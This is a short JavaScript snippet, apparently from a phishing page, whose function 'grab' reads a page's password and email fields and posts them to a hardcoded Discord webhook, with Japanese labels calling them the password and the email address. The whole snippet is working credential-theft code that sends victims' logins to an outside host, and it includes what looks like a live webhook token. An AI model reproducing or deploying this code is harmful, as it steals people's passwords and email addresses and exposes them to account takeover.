function grab(){
  let xhr = new XMLHttpRequest()
  xhr.open('POST','https://discord.com/api/webhooks/990568750480756766/zhtrSJ9hl4U2zuuqmiBihBHsaXMXecU1ThdYxQOYbMQPO5ByqwiYeof0wYHEEuOBy_qr')
  xhr.setRequestHeader('Content-Type','application/json')
  xhr.send(JSON.stringify({"content":`パスワードはこれ: ${document.getElementById('pass').value}\nメアドはこれ: ${document.getElementById('mail').value}`}))
}
